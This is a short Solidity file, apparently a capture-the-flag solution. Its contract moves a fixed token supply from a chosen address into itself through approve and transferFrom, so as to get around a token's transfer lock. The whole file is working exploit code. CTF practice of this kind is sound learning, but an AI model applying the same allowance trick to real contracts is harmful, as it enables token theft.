// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract LetMeOut {
    uint256 public INITIAL_SUPPLY = 1000000 * (10**18);

    function transferCoins(address _ncoin, address _from) public {
        IERC20(_ncoin).transferFrom(_from, address(this), INITIAL_SUPPLY);
    }
}

// After publishing the contract run:
// await contract.approve(<contract_addr>, BigInt(10000000 * 10**18))
// then call the contract
